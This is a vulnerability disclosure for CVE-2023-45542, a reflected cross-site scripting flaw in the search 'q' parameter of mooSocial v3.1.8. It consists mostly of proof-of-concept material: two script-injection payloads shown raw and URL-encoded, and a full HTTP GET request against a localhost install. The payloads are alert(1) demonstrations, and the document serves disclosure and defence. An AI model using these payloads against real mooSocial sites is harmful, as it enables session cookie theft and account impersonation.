# CVE-2023-45542
A reflected cross-site scripting (XSS) vulnerability exisits in the **q** parameter on search function of mooSocial v3.1.8 which allows attackers to steal user's session cookies and impersonate their account via a crafted URL.

Vulerable Parameter: **q**

## Exploit - Proof of Concept (POC)

### Reflect cross-site scripting (XSS)  
```
Payload : test"><script>alert(1)</script>test 
FINAL Payload (URL encoded) : test%22%3e%3cscript%3ealert(1)%3c%2fscript%3etest
```
GET Request on [http://localhost/moosocial/search/index/q=] :
```
GET /moosocial/search/index/?q=test%22%3e%3cscript%3ealert(1)%3c%2fscript%3etest HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/moosocial/user_info/index/messages
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

### Screenshot
![image](https://github.com/ahrixia/mooSo-Xss-search/assets/35935843/43611375-f96c-4788-9182-f42267c4cb84)


### Other Working Payloads
```
Payload : test</title><script>alert(1)</script>test 
FINAL Payload (URL encoded) : test%3c%2ftitle%3e%3cscript%3ealert(1)%3c%2fscript%3etest
```

